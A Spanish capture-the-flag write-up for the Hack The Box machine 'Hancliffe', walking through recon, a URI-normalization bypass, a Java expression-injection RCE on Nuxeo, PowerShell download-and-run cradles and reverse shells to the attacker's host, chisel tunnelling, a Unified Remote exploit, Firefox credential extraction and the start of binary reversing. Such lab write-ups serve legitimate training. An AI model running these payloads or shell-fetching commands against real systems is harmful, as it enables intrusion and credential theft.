---
layout: post
title: Hancliffe
date: 2023-01-26
description: 
img:
fig-caption:
tags: [OSED, OSCP (Intrusión), eWPT, eWPTxv2, OSWE]
---
___

<center><img src="/writeups/assets/img/Hancliffe-htb/Hancliffe_banner.png" alt="" style="height: 394px; width:520px;"></center>

***

# Conocimientos

* Abuso de normalización URI

* SSTI

* User Pivoting 1

* Desencriptación de contraseñas Firefox

* User Pivoting 2

* Debbug Archivo EXE con Ghidra

* Análisis de código en c

* Criptografía 1

* Criptografía 2

* Analisis de código en ensamblador

* Creación de sentencias para desplazarse entre registros

* Debbuging con x32dbg

* Buffer Overflow - Socket Reuse (Avanzado)

***

# Reconocimiento

## Escaneo de puertos con nmap

### Descubrimiento de puertos abiertos

```null
nmap -p- --open --min-rate 5000 -n -Pn -sS -vvv 10.10.11.115 -oG openports
Starting Nmap 7.93 ( https://nmap.org ) at 2023-01-25 17:19 GMT
Initiating SYN Stealth Scan at 17:19
Scanning 10.10.11.115 [65535 ports]
Discovered open port 8000/tcp on 10.10.11.115
Discovered open port 80/tcp on 10.10.11.115
Increasing send delay for 10.10.11.115 from 0 to 5 due to 11 out of 17 dropped probes since last increase.
Discovered open port 9999/tcp on 10.10.11.115
Increasing send delay for 10.10.11.115 from 5 to 10 due to 11 out of 23 dropped probes since last increase.
sendto in send_ip_packet_sd: sendto(5, packet, 44, 0, 10.10.11.115, 16) => Operation not permitted
Completed SYN Stealth Scan at 17:20, 68.58s elapsed (65535 total ports)
Nmap scan report for 10.10.11.115
Host is up, received user-set (0.15s latency).
Scanned at 2023-01-25 17:19:12 GMT for 69s
Not shown: 65532 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT     STATE SERVICE  REASON
80/tcp   open  http     syn-ack ttl 127
8000/tcp open  http-alt syn-ack ttl 127
9999/tcp open  abyss    syn-ack ttl 127

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 68.67 seconds
           Raw packets sent: 327714 (14.419MB) | Rcvd: 26 (1.144KB)
```

### Escaneo de Servicios y Versiones de cada puerto

```null
nmap -sCV -p80,8000,9999 10.10.11.115 -oN portscan
Starting Nmap 7.93 ( https://nmap.org ) at 2023-01-25 17:21 GMT
Nmap scan report for 10.10.11.115
Host is up (0.072s latency).

PORT     STATE SERVICE VERSION
80/tcp   open  http    nginx 1.21.0
|_http-server-header: nginx/1.21.0
|_http-title: Welcome to nginx!
8000/tcp open  http    nginx 1.21.0
|_http-server-header: nginx/1.21.0
|_http-title: HashPass | Open Source Stateless Password Manager
9999/tcp open  abyss?
| fingerprint-strings: 
|   FourOhFourRequest, GetRequest, HTTPOptions: 
|     Welcome Brankas Application.
|     Username: Password:
|   NULL: 
|     Welcome Brankas Application.
|_    Username:
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port9999-TCP:V=7.93%I=7%D=1/25%Time=63D16504%P=x86_64-pc-linux-gnu%r(NU
SF:LL,27,"Welcome\x20Brankas\x20Application\.\nUsername:\x20")%r(GetReques
SF:t,31,"Welcome\x20Brankas\x20Application\.\nUsername:\x20Password:\x20")
SF:%r(HTTPOptions,31,"Welcome\x20Brankas\x20Application\.\nUsername:\x20Pa
SF:ssword:\x20")%r(FourOhFourRequest,31,"Welcome\x20Brankas\x20Application
SF:\.\nUsername:\x20Password:\x20");

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 43.15 seconds
```

Con whatweb escaneo las tecnologías que utiliza el servidor web

```null
whatweb http://10.10.11.115
http://10.10.11.115 [200 OK] Country[RESERVED][ZZ], HTML5, HTTPServer[nginx/1.21.0], IP[10.10.11.115], Title[Welcome to nginx!], nginx[1.21.0]

whatweb http://10.10.11.115:8000
http://10.10.11.115:8000 [200 OK] Country[RESERVED][ZZ], HTML5, HTTPServer[nginx/1.21.0], IP[10.10.11.115], JQuery, Open-Graph-Protocol[website], PHP[8.0.7], PasswordField[masterpassword], Script, Title[HashPass | Open Source Stateless Password Manager], X-Powered-By[PHP/8.0.7], nginx[1.21.0]
```

## Puerto 9999

Si me conecto con netcat, me aparece la siguiente aplicación

```null
nc 10.10.11.115 9999
Welcome Brankas Application.
Username: admin
Password: admin
Username or Password incorrect
```

Me pide un usuario y una contraseña para entrar, del cual no dispongo y como tarda en responder no creo que sea óptimo aplicar fuerza bruta

## Puerto 80 (HTTP) | Puerto 8000 (HTTP)

El contenido de la página principal es el siguiente:

<img src="/writeups/assets/img/Hancliffe-htb/1.png" alt="">

Y por el puerto 8000

<img src="/writeups/assets/img/Hancliffe-htb/2.png" alt="">

Tiene un campo que genera contraseñas en función de los datos de que le pases al formulario

Hago fuzzing en el puerto 80 y encuentro una ruta que aplica un redirect a otro directorio

```null
gobuster dir -u http://10.10.11.115/ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 40 -x txt,html,php
===============================================================
Gobuster v3.4
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.11.115/
[+] Method:                  GET
[+] Threads:                 40
[+] Wordlist:                /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.4
[+] Extensions:              txt,html,php
[+] Timeout:                 10s
===============================================================
2023/01/25 17:47:23 Starting gobuster in directory enumeration mode
===============================================================
/index.html           (Status: 200) [Size: 612]
/Index.html           (Status: 200) [Size: 612]
/%20                  (Status: 200) [Size: 612]
/maintenance          (Status: 302) [Size: 0] [--> /nuxeo/Maintenance/]
/INDEX.html           (Status: 200) [Size: 612]
```

Intercepto la respuesta con BurpSuite

<img src="/writeups/assets/img/Hancliffe-htb/3.png" alt="">

El redirect lo aplica siguiendo la cabecera Location

Vuelvo a aplicar fuzzing, pero esta vez añadiendo una barra al final

```null
gobuster dir -u http://10.10.11.115/ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 40 --add-slash
===============================================================
Gobuster v3.4
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.11.115/
[+] Method:                  GET
[+] Threads:                 40
[+] Wordlist:                /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.4
[+] Add Slash:               true
[+] Timeout:                 10s
===============================================================
2023/01/25 17:59:35 Starting gobuster in directory enumeration mode
===============================================================
/maintenance/         (Status: 200) [Size: 714]
```

Ahora el código de estado es 200 y no aplica el redirect

Si intercepto la petición con BurpSuite, y capturo la respuesta puedo ver que se está arrastrando una cookie de sesión

<img src="/writeups/assets/img/Hancliffe-htb/4.png" alt="">

La estructura es típica de TomCat, por lo que es probable que haya un reverse proxy por detrás. Algunas versiones de Tomcat tienen una vulnerabilidad que permite acceder a rutas a las que no se debería tener acceso. Se le conoce como Abuse URI Normalization. En este [artículo](https://i.blackhat.com/us-18/Wed-August-8/us-18-Orange-Tsai-Breaking-Parser-Logic-Take-Your-Path-Normalization-Off-And-Pop-0days-Out-2.pdf) está detallado en qué consiste

<img src="/writeups/assets/img/Hancliffe-htb/5.png" alt="">

<img src="/writeups/assets/img/Hancliffe-htb/6.png" alt="">

Para poder abusar de este bypass de restricciones, hay que conocer la ruta de antes, no por poner estas estructuras en la URL va a desaparecer el Forbbiden

Fuzzeo por archivos y extensiones dentro del directorio maintenance, sabiendo que por detrás hay un TomCat, por lo que le incorporo la extensión jsp

```null
gobuster dir -u http://10.10.11.115/maintenance -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 20 -x jsp
===============================================================
Gobuster v3.4
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.11.115/maintenance
[+] Method:                  GET
[+] Threads:                 20
[+] Wordlist:                /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.4
[+] Extensions:              jsp
[+] Timeout:                 10s
===============================================================
2023/01/25 18:14:05 Starting gobuster in directory enumeration mode
===============================================================
/index.jsp            (Status: 200) [Size: 714]
```

Como se por el redirect que la ruta maintenance está bajo el directorio nuxeo, aplico fuzzing abusando del URI Normalization, añadiendole la extensión jsp

Encuentra un panel de inicio de sesión

```null
wfuzz -c --hc=404 -t 150 -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt "http://10.10.11.115/maintenance/..;/FUZZ.jsp"
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://10.10.11.115/maintenance/..;/FUZZ.jsp
Total requests: 220546

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                                         
=====================================================================

000000001:   302        0 L      0 W        0 Ch        "index"                                                                                                                                         
000000039:   200        450 L    882 W      8871 Ch     "login"
```

<img src="/writeups/assets/img/Hancliffe-htb/7.png" alt="">

Busco vulnerabilidades que estén relacionadas con Nuxeo

```null
searchsploit nuxeo
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                                                 |  Path
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Nuxeo 6.0/7.1/7.2/7.3 - Remote Code Execution (Metasploit)                                                                                                                     | jsp/webapps/41748.rb
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

Como el Metasploit no se puede utilizar en el OSCP, busco por una alternativa en python

Encuentro un CVE en [Github](https://github.com/mpgn/CVE-2018-16341) donde explican la vulnerabilidad y comparten un script que lo automatiza

Para comprobar si es vulnerable, tengo que dirigirme a una ruta específica e inyectar un SSTI, teniendo en cuenta que tengo que abusar del URI Normalization. En caso de que se interprete podré continuar

<img src="/writeups/assets/img/Hancliffe-htb/8.png" alt="">

Se da el caso, 7*7 = 49, y se ve reflejado en el error

En [PayloadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#java) busco por Server Side Template Inyection y filtro por Java, para ver los payloads más comunes de ejecución remota de comandos

Me pongo en escucha de trazas ICMP por la interfaz tun0 para enviarme un ping a mi equipo

Probando el primer payload no ejecuta nada y me devuelve un código de estado 500 y no recibo nada

```null
${T(java.lang.Runtime).getRuntime().exec('')}
```

El segundo tampoco, pero me devuelve un código de estado diferente

Busco por más tipos de payload que comiencen por '${'

Llego a una sección llamada Expression Language EL - Code Execution. Como un ejemplo veo que está ejecutando un binario de Windows, pruebo con ese

```null
${"".getClass().forName("java.lang.Runtime").getMethods()[6].invoke("".getClass().forName("java.lang.Runtime")).exec("ping -n 1 10.10.16.6")}
```

Y ahora sí, recibo la traza ICMP

```null
tcpdump -i tun0 icmp -n
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
18:52:43.194947 IP 10.10.11.115 > 10.10.16.6: ICMP echo request, id 1, seq 2, length 40
18:52:43.194968 IP 10.10.16.6 > 10.10.11.115: ICMP echo reply, id 1, seq 2, length 40
```

Para ganar acceso al sistema, utilizo Invoke-PowerShellTcp.ps1, del repositorio de nishang

En la última linea indico mi el comando que tiene que ejecutar una vez interpretado

```null
cat Invoke-PowerShellTcp.ps1 | tail -n 1
Invoke-PowerShellTcp -Reverse -IPAddress 10.10.16.6 -Port 443
```

Creo un servicio http con python para compartir el recurso y desde el payload del SSTI, introduzco una sentencia en powershell para que se ejecute

```null
python3 -m http.server 80
```

Para evitar problemas con las comillas, lo convierto a base64 con el encoder UTF-16le

```null
echo -n "IEX(New-Object Net.WebClient).downloadString('http://10.10.16.6/Invoke-PowerShellTcp.ps1')" | iconv -t utf-16le | base64 -w 0 | xclip -sel clip
```

Introduzco el payload en la URL, lo urlencodeo con BurpSuite y al enviar gano acceso al sistema

```null
${"".getClass().forName("java.lang.Runtime").getMethods()[6].invoke("".getClass().forName("java.lang.Runtime")).exec("powershell -e SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAMAAuADEAMAAuADEANgAuADYALwBJAG4AdgBvAGsAZQAtAFAAbwB3AGUAcgBTAGgAZQBsAGwAVABjAHAALgBwAHMAMQAnACkA")}
```

<img src="/writeups/assets/img/Hancliffe-htb/9.png" alt="">

```null
nc -nlvp 443
listening on [any] 443 ...
connect to [10.10.16.6] from (UNKNOWN) [10.10.11.115] 51196
Windows PowerShell running as user svc_account on HANCLIFFE
Copyright (C) 2015 Microsoft Corporation. All rights reserved.

PS C:\Nuxeo>whoami
hancliffe\svc_account
PS C:\Nuxeo> 
```

En el escritorio del usuario hay un script en batch

```null
PS C:\Users\svc_account\Desktop> type server.bat
cd C:\Nginx
C:\Nginx\Start.bat
```

Si abro el otro script

```null
PS C:\Users\svc_account\Desktop> type C:\Nginx\Start.bat
@echo off
start C:\nginx\nginx.exe
start C:\php\php-cgi.exe -b 127.0.0.1:8888
popd
EXIT /b
```

Al listar los puertos abiertos, puedo ver más de los que el nmap me reportaba

```null
PS C:\Users\svc_account\Desktop> PS C:\Users\svc_account\Desktop> netstat -nat

Active Connections

  Proto  Local Address          Foreign Address        State           Offload State

  TCP    0.0.0.0:80             0.0.0.0:0              LISTENING       InHost      
  TCP    0.0.0.0:135            0.0.0.0:0              LISTENING       InHost      
  TCP    0.0.0.0:445            0.0.0.0:0              LISTENING       InHost      
  TCP    0.0.0.0:5040           0.0.0.0:0              LISTENING       InHost      
  TCP    0.0.0.0:5432           0.0.0.0:0              LISTENING       InHost      
  TCP    0.0.0.0:5985           0.0.0.0:0              LISTENING       InHost      
  TCP    0.0.0.0:8000           0.0.0.0:0              LISTENING       InHost      
  TCP    0.0.0.0:9510           0.0.0.0:0              LISTENING       InHost      
  TCP    0.0.0.0:9512           0.0.0.0:0              LISTENING       InHost      
  TCP    0.0.0.0:9720           0.0.0.0:0              LISTENING       InHost      
  TCP    0.0.0.0:9999           0.0.0.0:0              LISTENING       InHost      
  TCP    0.0.0.0:47001          0.0.0.0:0              LISTENING       InHost      
  TCP    0.0.0.0:49664          0.0.0.0:0              LISTENING       InHost      
  TCP    0.0.0.0:49665          0.0.0.0:0              LISTENING       InHost      
  TCP    0.0.0.0:49666          0.0.0.0:0              LISTENING       InHost      
  TCP    0.0.0.0:49667          0.0.0.0:0              LISTENING       InHost      
  TCP    0.0.0.0:49668          0.0.0.0:0              LISTENING       InHost      
```

Para no tener que montarme un proxy por SOCKS5 o hacer port forwarding a mi equipo, utilizo un oneliner en powershell que se encarga de hacer un escaneo rápido

```null
Get-NetTCPConnection -State Listen | Select-Object -Property *,@{'Name' = 'ProcessName';'Expression'={(Get-Process -Id $_.OwningProcess).Name}}
```

Esto devuelve una cantidad de campos vacíos innecesarios. Para evitar ruido, utilizo format tables para seleccionar solo los que me interesan

```null
PS C:\Users\svc_account\Desktop> Get-NetTCPConnection -State Listen | Select-Object -Property *,@{'Name' = 'ProcessName';'Expression'={(Get-Process -Id $_.OwningProcess).Name}} | FT -Property LocalAddress,LocalPort,ProcessName

LocalAddress LocalPort ProcessName    
------------ --------- -----------    
::               49668 services       
::               49667 svchost        
::               49666 svchost        
::               49665 wininit        
::               49664 lsass          
::               47001 System         
::                5985 System         
::                5432 postgres       
::                 445 System         
::                 135 svchost        
0.0.0.0          49668 services       
0.0.0.0          49667 svchost        
0.0.0.0          49666 svchost        
0.0.0.0          49665 wininit        
0.0.0.0          49664 lsass          
0.0.0.0           9999 svchost        
0.0.0.0           9741 MyFirstApp     
0.0.0.0           9512 RemoteServerWin
0.0.0.0           9510 RemoteServerWin
127.0.0.1         9300 java           
127.0.0.1         9200 java           
127.0.0.1         8888 php-cgi        
127.0.0.1         8080 java           
127.0.0.1         8009 java           
127.0.0.1         8005 java           
0.0.0.0           8000 nginx          
0.0.0.0           5432 postgres       
0.0.0.0           5040 svchost        
10.10.11.115       139 System         
0.0.0.0            135 svchost        
0.0.0.0             80 nginx  
```

En el puerto 9512 está corriendo un RemoteServerWin. En este [artículo](https://howtodoninja.com/files/exe/remoteserverwin-exe/remoteserverwin-exe-virus-malware-uninstall-fix/) explican en que consiste

<img src="/writeups/assets/img/Hancliffe-htb/10.png" alt="">

Hace refencia a "Unified Remote", que al buscar por vulnerabilidades en exploit-db, encuentro una ejecución remota de comandos

```null
searchsploit Unified Remote
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                                                 |  Path
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
CA Unified Infrastructure Management Nimsoft 7.80 - Remote Buffer Overflow                                                                                                     | windows/remote/48156.c
Cisco Unified Operations Manager - Multiple Vulnerabilities                                                                                                                    | windows/remote/17304.txt
Cisco Unified Operations Manager 8.5 - '/iptm/faultmon/ui/dojo/Main/eventmon_wrapper.jsp' Multiple Cross-Site Scripting Vulnerabilities                                        | hardware/remote/35765.txt
Cisco Unified Operations Manager 8.5 - '/iptm/logicalTopo.do' Multiple Cross-Site Scripting Vulnerabilities                                                                    | hardware/remote/35766.txt
Cisco Unified Operations Manager 8.5 - 'iptm/advancedfind.do?extn' Cross-Site Scripting                                                                                        | hardware/remote/35762.txt
Cisco Unified Operations Manager 8.5 - 'iptm/ddv.do?deviceInstanceName' Cross-Site Scripting                                                                                   | hardware/remote/35763.txt
Cisco Unified Operations Manager 8.5 - Common Services Device Center Cross-Site Scripting                                                                                      | hardware/remote/35780.txt
Cisco Unified Operations Manager 8.5 - iptm/eventmon Multiple Cross-Site Scripting Vulnerabilities                                                                             | hardware/remote/35764.txt
Comodo Unified Threat Management Web Console 2.7.0 - Remote Code Execution                                                                                                     | multiple/webapps/48825.py
McAfee Unified Threat Management Firewall 4.0.6 - 'page' Cross-Site Scripting                                                                                                  | windows/remote/34115.txt
NVR SP2 2.0 'nvUnifiedControl.dll 1.1.45.0' - 'SetText()' Command Execution                                                                                                    | windows/remote/4322.html
Sun ONE Unified Development Server 5.0 - Recursive Document Type Definition                                                                                                    | multiple/remote/22178.xml
Unified Remote 3.9.0.2463 - Remote Code Execution                                                                                                                              | windows/remote/49587.py
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
```

Me descargo el script y subo el chisel a la máquina víctima para montarme un proxy por SOCKS5 y tener conectividad

```null
searchsploit -m windows/remote/49587.py
mv 49587.py uniremote.py
```

Me monto un servicio http con python

```null
python3 -m http.server 80
```

Desde la máquina víctima lo descargo

```null
PS C:\Users\svc_account\Desktop> certutil.exe -f -split -urlcache http://10.10.16.6/chisel.exe chisel.exe
****  Online  ****
  000000  ...
  2f2c00
CertUtil: -URLCache command completed successfully.
```

En mi equipo local monto un servidor con chisel

```null
chisel server -p 1234 --reverse
2023/01/25 20:28:57 server: Reverse tunnelling enabled
2023/01/25 20:28:57 server: Fingerprint E6/3bj08/E9LC4txplBgXwdWVrNZePV5l/ojP++SBfw=
2023/01/25 20:28:57 server: Listening on http://0.0.0.0:1234
```

En la máquina víctima me conecto

```null
PS C:\Users\svc_account\Desktop> .\chisel.exe client 10.10.16.6:1234 R:socks
```

Inspeccionando el exploit del Unified, veo que necesito un binario .exe para que lo suba a la máquina y lo ejecute

Con msfvenom, creo uno que me entable una reverse shell a mi equipo

```null
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.16.6 LPORT=443 --platform windows -f c -o payload.exe
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 324 bytes
Final size of c file: 1392 bytes
Saved as: payload.exe
```

Ejecuto el exploit pasando por el proxy

```null
python3 -m http.server 80
proxychains python2 uniremote.py 10.10.11.115 10.10.16.6 payload.exe
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[+] Connecting to target...
[+] Popping Start Menu
[+] Opening CMD
[+] *Super Fast Hacker Typing*
[+] Downloading Payload
[+] Done! Check listener?
```

Gano acceso al sistema como el usuario clara

```null
rlwrap nc -nlvp 443
listening on [any] 443 ...
connect to [10.10.16.6] from (UNKNOWN) [10.10.11.115] 51363
Microsoft Windows [Version 10.0.19043.1266]
(c) Microsoft Corporation. All rights reserved.

C:\Users\clara>whoami
whoami
hancliffe\clara

C:\Users\clara>
```

Y puedo visualizar la primera flag

```null
C:\Users\clara\Desktop>type user.txt
type user.txt
1cbb8f5306279fb31ac63224431112e7
```

# Escalada

No tengo ningún privilegio especial

```null
C:\Users\clara\Desktop>whoami /priv
whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                          State   
============================= ==================================== ========
SeShutdownPrivilege           Shut down the system                 Disabled
SeChangeNotifyPrivilege       Bypass traverse checking             Enabled 
SeUndockPrivilege             Remove computer from docking station Disabled
SeIncreaseWorkingSetPrivilege Increase a process working set       Disabled
SeTimeZonePrivilege           Change the time zone                 Disabled
```

En la raíz hay un directorio llamado DevApp

```null
C:\>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is B0F6-2F1B

 Directory of C:\

09/14/2021  09:57 AM    <DIR>          DevApp
06/26/2021  09:45 PM    <DIR>          nginx
06/26/2021  04:16 AM    <DIR>          Nuxeo
12/07/2019  01:14 AM    <DIR>          PerfLogs
06/26/2021  07:49 PM    <DIR>          php
08/27/2021  06:20 AM    <DIR>          Program Files
06/26/2021  09:15 PM    <DIR>          Program Files (x86)
06/26/2021  09:35 PM    <DIR>          Users
10/03/2021  10:08 PM    <DIR>          Windows
               0 File(s)              0 bytes
               9 Dir(s)   5,761,298,432 bytes free
```

Pero no tengo acceso para entrar

```null
C:\>cd DevApp
cd DevApp
Access is denied.
```

Hay un usuario en el sistema development

```null
C:\>net user
net user

User accounts for \\HANCLIFFE

-------------------------------------------------------------------------------
Administrator            clara                    DefaultAccount           
development              Guest                    svc_account              
WDAGUtilityAccount       
The command completed successfully.
```

Si me convierto en este quiero pensar que si tendré acceso al otro directorio

Subo el WinPeas a la máquina para aplicar reconocimiento

Y encuentra contraseñas almacenadas en Firefox

```null

  Showing saved credentials for Firefox
     Url:           http://localhost:8000
     Username:      hancliffe.htb
     Password:      #@H@ncLiff3D3velopm3ntM@st3rK3y*!
```

Si voy al generador de contraseñas que estaba expuesto en el puerto 8000 e introduzco esos datos para el usuario development, obtengo su contraseña

<img src="/writeups/assets/img/Hancliffe-htb/11.png" alt="">

Como el usuario development pertenece al grupo Remote Management Users, me puedo conectar con evil-winrm

```null
proxychains evil-winrm -i 10.10.11.115 -u 'development' -p 'AMl.q2DHp?2.C/V0kNFU'
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4

Evil-WinRM shell v3.4

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\development\Documents> 
```

Ahora puedo acceder al directorio que no tenía acceso. Dentro hay dos archivos

```null

```

Al tratar de transferirmelo por SMB, me da este error

```null
*Evil-WinRM* PS C:\DevApp> copy .\MyFirstApp.exe \10.10.16.6\shared\MyFirsApp.exe
Could not find a part of the path 'C:\10.10.16.6\shared\MyFirsApp.exe'.
At line:1 char:1
+ copy .\MyFirstApp.exe \10.10.16.6\shared\MyFirsApp.exe
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : NotSpecified: (:) [Copy-Item], DirectoryNotFoundException
    + FullyQualifiedErrorId : System.IO.DirectoryNotFoundException,Microsoft.PowerShell.Commands.CopyItemCommand
```

En mi máquina linux monto el servidor SMB pero con autenticación

```null
impacket-smbserver shared $(pwd) -smb2support -user rubbx -password rubbx
```

Desde la máquina victima, creo una unidad lógica x: que esté sincronizada con mis recursos compartidos

```null
*Evil-WinRM* PS C:\DevApp> net use x: \\10.10.16.6\shared /user:rubbx rubbx
The command completed successfully.
```

Copio el binario a la unidad lógica

```null
*Evil-WinRM* PS C:\DevApp> copy .\MyFirstApp.exe x:\MyFirstApp.exe
```

Con Strings, filtro por la cadena que veía al conectarme por netcat al puerto 9999 y la encuentra

```null
strings MyFirstApp.exe | grep -i "Welcome Brankas Application."
Welcome Brankas Application.
```

Por tanto esta es la aplicación que corre en el puerto 9999.Para ver como está estructurada, abro la importo en Ghidra

Dentro de exports, se encuentra la función principal

<img src="/writeups/assets/img/Hancliffe-htb/12.png" alt="">

<img src="/writeups/assets/img/Hancliffe-htb/13.png" alt="">

Pero como no hay nada descriptivo, me dirijo al buscador para encontrar lo que me interesa

<img src="/writeups/assets/img/Hancliffe-htb/14.png" alt="">

<img src="/writeups/assets/img/Hancliffe-htb/15.png" alt="">

Al conectarme por netcat me pedía un usuario y una contraseña, por lo que si filtro por Username encuentro donde está definido

<img src="/writeups/assets/img/Hancliffe-htb/16.png" alt="">

Para poder ver el código, tengo que ir a las referencias y selecciono el único match

<img src="/writeups/assets/img/Hancliffe-htb/17.png" alt="">

<img src="/writeups/assets/img/Hancliffe-htb/18.png" alt="">

Al abrirlo puedo ver el siguiente código en c

<img src="/writeups/assets/img/Hancliffe-htb/19.png" alt="">

Si hago doble click en la función login, puedo ver donde se define

<img src="/writeups/assets/img/Hancliffe-htb/20.png" alt="">

<img src="/writeups/assets/img/Hancliffe-htb/21.png" alt="">

Se leakea un usuario en texto claro y una contraseña que se procesa mediante un par de funciones para generar la final. Para entender mejor como funciona el código y referenciar mejor a las variables les cambio el nombre por uno más visual

A la función login se le están pasando por referencia dos variables, que corresponde al input que le proporciono con netcat, es decir, también son el usuario y la contraseña. La función _memmove no sabía lo que era, así que lo busco en Google y según Microsoft es para pasar el contenido de una variable a otra, por lo que local_39 es otra vez la contraseña

<img src="/writeups/assets/img/Hancliffe-htb/22.png" alt="">

Tras estas modicaciones, se ve así el resultado

<img src="/writeups/assets/img/Hancliffe-htb/23.png" alt="">

Abro la función encrypt_1 para ver en que consiste

<img src="/writeups/assets/img/Hancliffe-htb/24.png" alt="">

De la misma forma, param_2 quiero pensar que es la contraseña. Se la está proporcionando como argumento a otra función llamada _strdup, como no se lo que hace, vuelvo a buscarlo en Google y encuentro la respuesta

<img src="/writeups/assets/img/Hancliffe-htb/25.png" alt="">

Parece ser que crea un duplicado del número de bytes del argumento que se le ha proporcionado. Como de momento no se a qué se refiere, renombraré a la variable _Str como modpassword

La función _strlen() devuelve la longitud de la contraseña que previamente se ha modificado con _strdup(). Le cambio el nombre a sVar2 por modpasslen

La variable local_10 es interna del bucle for(), por lo que la puedo sustituir por la típica 'i' que se suele utilizar de ejemplo. Desde que 'i' vale 0 hasta que su valor es una unidad mayor que la longitud de la contraseña modificada, se le irá incrementando su valor en una unidad. Va iterando por cada caracter y aplica una compativa de un espacio con respecto al caracter y a su vez se tiene que cumplir que no es igual a la cadena en hexadecimal '\x7f'. Para verlo de forma más clara, convierto el valor del espacio y de la cadena en hexadecimal a decimal. En caso de que la condición se cumpla, si el caracter es menor que ese mismo valor, se le va a sumar '0x2f', que es 47 en decimal. De una forma más concreta, esto es como aplicar un rot47, aunque el más común es rot13. En caso de que el caracter al aplicar el rot47 sea menor que 127, se le va a asignar ese valor a la posición de la contraseña que corresponda. En caso contario, se le va a restar al rot47 '0x5e', que corresponde a 94 en decimal. Y finalmente se retorna el valor de la contraseña

Le cambio el nombre a cVar1 por rot47char, y el nombre de la función _encrypt1 por rot47

Una vez desglosada la función tiene la siguiente pinta:

<img src="/writeups/assets/img/Hancliffe-htb/26.png" alt="">

Vuelvo a la función del login, cambio los valores de algunas variables porque había repetido password y me entraba en conflicto

<img src="/writeups/assets/img/Hancliffe-htb/27.png" alt="">

Como se estaba retornando el valor de password la función rot47 y lo está igualando a local_18, le cambio el nombre a modpassrot47. Local_1c está extrayendo la longitud total de modpassrot47, así que le cambio el nombre a modpassrot47len.

Para ir poco a poco haciendo el proceso inverso y encriptando la contraseña que tengo, abro cyberchef en el navegador y le voy introduciendo los encoders que conozco. Para empezar está en base64 y se le ha aplicado un rot47

<img src="/writeups/assets/img/Hancliffe-htb/28.png" alt="">

A la función _encrypt2, le está pasando la contraseña en formato rot47 y su longitud como argumentos. Si abro _encrypt2 se puede ver lo siguiente:

<img src="/writeups/assets/img/Hancliffe-htb/29.png" alt="">

Cambio otra vez los nombres de las variables siguiendo el mismo principio que en la otra función. En local_11 está almacenando cada caracter de la contraseña en rot47 modificada y está aplicando ciertas comparativas para que en caso de que se cumpla una de esas condiciones se le asigne a la contraseña en rot47 modificada el valor del caracter. Para ir más al grano, voy a cambiar directamente todos los valores que están en hexadecimal a decimal. Cambio el nombre de la variable local_11 a chr.

Si hago un man ASCII desde consola, puedo ver que aquellos caracteres menores de 65 son símbolos

```null
072   58    3A    :
073   59    3B    ;
074   60    3C    <
075   61    3D    =
076   62    3E    >
077   63    3F    ?
```

Pasa lo mismo para los mayores de 90 y menores de 97

```null
133   91    5B    [
134   92    5C    \  '\\'
135   93    5D    ]
136   94    5E    ^
137   95    5F    _
140   96    60    `
```

Y en el otro intervalo

```null
172   122   7A    z
173   123   7B    {
174   124   7C    |
175   125   7D    }
